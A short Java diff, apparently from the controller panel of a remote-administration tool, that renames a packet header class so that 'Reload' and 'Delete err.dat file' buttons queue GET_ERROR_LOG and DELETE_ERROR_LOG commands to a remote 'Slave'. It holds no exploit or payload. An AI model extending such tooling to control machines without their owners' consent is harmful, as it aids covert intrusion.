@@ -13,7 +13,7 @@ import javax.swing.LayoutStyle.ComponentPlacement;
 import javax.swing.ScrollPaneConstants;
 
 import com.redpois0n.Slave;
-import com.redpois0n.packets.outgoing.Header;
+import com.redpois0n.packets.OutgoingHeader;
 
 
 @SuppressWarnings("serial")
@@ -34,7 +34,7 @@ public class PanelControlErrorLog extends PanelControlParent {
 		JButton btnReload = new JButton("Reload");
 		btnReload.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				slave.addToSendQueue(Header.GET_ERROR_LOG);
+				slave.addToSendQueue(OutgoingHeader.GET_ERROR_LOG);
 			}
 		});
 		btnReload.setIcon(new ImageIcon(PanelControlErrorLog.class.getResource("/icons/update.png")));
@@ -42,7 +42,7 @@ public class PanelControlErrorLog extends PanelControlParent {
 		JButton btnDeleteErrdatFile = new JButton("Delete err.dat file");
 		btnDeleteErrdatFile.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				slave.addToSendQueue(Header.DELETE_ERROR_LOG);
+				slave.addToSendQueue(OutgoingHeader.DELETE_ERROR_LOG);
 			}
 		});
 		btnDeleteErrdatFile.setIcon(new ImageIcon(PanelControlErrorLog.class.getResource("/icons/delete.png")));
